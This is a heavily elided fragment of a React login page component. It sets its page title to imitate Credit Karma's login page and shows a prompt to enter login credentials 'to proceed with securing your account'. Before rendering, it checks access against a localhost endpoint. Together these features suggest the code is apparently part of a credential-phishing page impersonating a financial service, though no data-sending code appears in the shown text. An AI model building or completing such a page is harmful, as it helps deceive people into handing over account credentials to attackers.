...
const LoginPage: React.FC = () => {
  ...
  useEffect(() => {
    ...
    axios.get('http://localhost:8000/api/check-access/')
      .then(() => {
        setIsAllowed(true);
      })
...
const handleSubmit = (event) => {
  ...
  return (
    <>
          <MetaTags title="Log in - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma"/> {/* Add this component to set the meta tags */}
      ...
      {(
        ...
        <div className="px-10 pt-4">
          ...
          <p className='font-bold mb-5'>Please enter your login credentials to proceed with securing your account.</p>
